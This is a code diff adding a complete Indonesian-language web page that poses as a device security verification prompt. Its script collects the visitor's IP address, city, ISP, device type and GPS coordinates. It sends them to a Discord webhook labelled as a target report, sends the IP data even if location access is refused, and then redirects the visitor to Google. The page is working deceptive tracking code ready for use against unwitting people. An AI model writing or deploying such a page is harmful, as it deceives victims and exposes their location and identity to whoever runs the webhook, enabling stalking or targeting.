@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Keamanan Perangkat</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        button { background: #0084ff; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>⚠️ Verifikasi Diperlukan</h2>
+        <p>Klik tombol di bawah untuk memverifikasi lokasi perangkat Anda guna mencegah akses tidak sah.</p>
+        <button onclick="ambilData()">VERIFIKASI SEKARANG</button>
+    </div>
+
+    <script>
+        const webhookURL = "MASUKKAN_URL_WEBHOOK_DISCORD_TUAN_X_DI_SINI";
+
+        async function ambilData() {
+            // 1. Ambil IP & Info Provider (Otomatis)
+            let ipData = { ip: "Tidak Terdeteksi", city: "N/A", org: "N/A" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) { console.error(e); }
+
+            // 2. Terjemahkan User Agent (Identitas HP) Secara Sederhana
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone")) os = "iOS (iPhone)";
+            else if (ua.includes("Windows")) os = "Windows PC";
+
+            // 3. Ambil Lokasi GPS Real-Time (Wajib klik Allow)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    const gmapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Kirim Data Lengkap ke Discord
+                    await kirimKeDiscord(ipData, os, gmapsLink, accuracy);
+                    
+                    // Pindah ke Google setelah sukses
+                    window.location.href = "https://www.google.com";
+                }, (err) => {
+                    // Jika target menolak GPS, tetap kirim data IP & Perangkat
+                    kirimKeDiscord(ipData, os, "Akses GPS Ditolak", "N/A");
+                    window.location.href = "https://www.google.com";
+                });
+            }
+        }
+
+        async function kirimKeDiscord(ip, os, maps, akurasi) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🚨 **TARGET TERDETEKSI (DATA LENGKAP)** 🚨",
+                    embeds: [{
+                        title: "Hasil Pelacakan Real-Time",
+                        color: 16711680,
+                        fields: [
+                            { name: "📱 Perangkat", value: os, inline: true },
+                            { name: "🌐 IP Address", value: ip.ip, inline: true },
+                            { name: "📍 Kota/ISP", value: `${ip.city}, ${ip.org}`, inline: false },
+                            { name: "🎯 Akurasi GPS", value: akurasi + " meter", inline: true },
+                            { name: "🗺️ Lokasi Google Maps", value: maps, inline: false }
+                        ],
+                        footer: { text: "cvAI4 - Lab System v2" }
+                    }]
+                })
+            });
+        }
+    </script>
+</body>
+</html>
